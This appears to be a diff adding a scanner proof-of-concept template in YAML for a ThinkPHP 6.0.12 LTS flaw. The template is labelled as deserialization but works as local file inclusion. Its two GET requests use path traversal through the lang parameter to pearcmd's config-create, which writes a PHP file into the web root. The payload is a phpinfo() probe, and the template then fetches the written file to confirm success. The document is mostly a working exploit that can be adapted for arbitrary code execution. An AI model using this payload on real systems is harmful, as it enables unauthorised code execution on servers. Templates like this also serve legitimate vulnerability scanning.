@@ -1,0 +1,17 @@
+id: poc-yaml-thinkphp-6-0-12-lts-file-inclusion
+info:
+  name: ThinkPHP 6.0.12LTS 反序列化漏洞
+  severity: critical
+  tags:
+  - 文件包含
+  finger: thinkphp
+variables:
+  t1: random_str(3)
+requests:
+- method: GET
+  path: /?+config-create+/&lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=phpinfo()?>+{{.t1}}.php
+  expression: status_code == 200 && contains(body,"PHP extension directory")
+- method: GET
+  path: /{{.t1}}.php
+  expression: status_code == 200 && contains(body,"php_dir") && contains(title,"phpinfo()")
+transport: http
